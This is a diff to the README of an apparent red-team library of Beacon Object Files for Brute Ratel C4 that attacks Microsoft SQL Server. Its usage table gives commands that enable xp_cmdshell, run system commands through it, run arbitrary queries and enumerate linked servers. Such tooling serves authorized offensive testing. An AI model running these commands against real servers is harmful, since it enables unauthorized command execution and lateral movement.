@@ -8,11 +8,12 @@ A library of Beacon Object Files (BOFs) for interacting with Microsoft SQL Serve
 |Commands|Usage|Notes|
 |--------|-----|-----|
 |coffexec /~/MSSQL-BOF-BRC4/SQL/1434udp/1434udp.x64.o 127.0.0.1|[server IP] |Enumerate SQL Server connection info|
-|coffexec /~/MSSQL-BOF-BRC4/SQL/enableXpcmd/enableXpcmd.x64.o 1|[new Value for xp_cmdshell] |Change value of xp_cmdshell|
+|coffexec /~/MSSQL-BOF-BRC4/SQL/enableXpcmd/enableXpcmd.x64.o 1 127.0.0.1|[new Value for xp_cmdshell][server][opt: link]|Change value of xp_cmdshell|
 |coffexec /~/MSSQL-BOF-BRC4/SQL/info/info.x64.o||Gather information about the SQL server|
 |coffexec /~/MSSQL-BOF-BRC4/SQL/query/query.x64.o "SELECT name,value FROM sys.configurations WHERE name = 'xp_cmdshell'"|[query]|Execute a custom SQL query|
-|coffexec /~/MSSQL-BOF-BRC4/SQL/whoami/whoami.x64.o||Gather logged in user, mapped user and roles|
-|coffexec /~/MSSQL-BOF-BRC4/SQL/xpcmd/xpcmd.x64.o "hostname && whoami"|[command]|Execute a system command via xp_cmdshell|
+|coffexec /~/MSSQL-BOF-BRC4/SQL/whoami/whoami.x64.o 127.0.0.1|[server][opt: link]|Gather logged in user, mapped user and roles|
+|coffexec /~/MSSQL-BOF-BRC4/SQL/xpcmd/xpcmd.x64.o "hostname && whoami" 127.0.0.1|[command][server][opt: link]|Execute a system command via xp_cmdshell|
+|coffexec /~/MSSQL-BOF-BRC4/SQL/links/links.x64.o 127.0.0.1|[server]|Enumerate linked servers|
 
 ## References
 - [SQL-BOF](https://github.com/Tw1sm/SQL-BOF)
